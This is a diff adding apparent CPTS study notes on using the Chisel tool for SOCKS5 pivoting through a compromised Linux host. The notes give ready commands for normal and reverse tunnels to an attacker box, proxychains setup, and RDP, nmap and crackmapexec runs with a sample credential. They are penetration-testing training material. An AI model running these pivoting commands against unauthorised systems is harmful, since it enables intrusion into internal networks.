@@ -1,0 +1,97 @@
+🔧 What Is Chisel?
+Chisel is a lightweight, Go-based tunneling tool that:
+
+Uses HTTP/WebSocket to tunnel data
+
+Creates SOCKS5 tunnels for pivoting
+
+Works through firewalls and NAT
+
+Can run in both normal and reverse modes
+
+Is a faster, leaner alternative to things like SSH or full proxychains when you need just a pivot
+
+🧠 Why Should You Care?
+Some labs or real-world targets block reverse shells, but allow outbound HTTP/WebSocket.
+
+You don’t always want to (or can’t) set up SSH keys and all that jazz — Chisel’s like a drop-in, one-binary setup.
+
+Can do SOCKS5 pivoting, which means once it's up, your tools (Nmap, RDP, SMB, etc.) all just work through proxychains.
+
+✅ TL;DR Chisel Normal Flow
+Scenario: You own a Linux box inside 172.16.5.0/23. You want to pivot into that network from your attack box.
+
+🔹 On Pivot Host (Compromised Ubuntu)
+bash
+Copy
+Edit
+./chisel server -v -p 1234 --socks5
+That exposes a SOCKS5 server over WebSocket on port 1234.
+
+🔹 On Your Attack Box
+bash
+Copy
+Edit
+./chisel client -v 10.129.202.64:1234 socks
+This connects back, and listens on 127.0.0.1:1080 — now a tunnel exists through the compromised machine.
+
+🔹 On Attack Box — Edit proxychains.conf
+bash
+Copy
+Edit
+socks5 127.0.0.1 1080
+🔹 Use it!
+bash
+Copy
+Edit
+proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
+🔁 Reverse Chisel Flow
+Use when: Pivot box (Ubuntu) has no inbound allowed, but can reach you (your attack box).
+
+🔹 On Your Attack Box (Chisel Server)
+bash
+Copy
+Edit
+./chisel server --reverse -v -p 1234 --socks5
+🔹 On Pivot Host (Client to you!)
+bash
+Copy
+Edit
+./chisel client -v 10.10.14.18:1234 R:socks
+Now the connection is reversed — the attack box listens, the pivot box dials out and SOCKS5 still ends up on 127.0.0.1:1080 on your machine.
+
+You reuse:
+
+bash
+Copy
+Edit
+socks5 127.0.0.1 1080
+Then:
+
+bash
+Copy
+Edit
+proxychains nmap / xfreerdp / crackmapexec / whatever
+🧪 Common Use-Cases
+Scenario	Use Chisel?
+Can't SSH into pivot?	✅ Reverse Chisel
+Need fast SOCKS5 tunnel?	✅
+Need HTTP/WebSocket tunneling?	✅
+Port forwarding single port?	❌ Use ssh -L or plink
+More flexibility with tools like proxychains?	✅ Chisel + SOCKS5
+Windows target only speaks HTTP out?	✅ (but needs x64 Go binary)
+Want pure stealth + encrypted C2?	❌ Use dnscat2 or Meterpreter
+⚠️ Pro Tip
+If it fails to run on target due to glibc or compatibility issues:
+
+Grab older static binaries from Chisel’s GitHub releases
+
+Or compile statically with older Go versions if you're feeling spicy
+
+🧠 Takeaway for CPTS + Real-World
+This is a great pivot tool to know and use.
+
+You won’t always need it for CPTS, but when SSH is off the table, Chisel is your boy.
+
+CPTS might lean into SSH or Meterpreter routes — but they’ll respect a pivot done with Chisel.
+
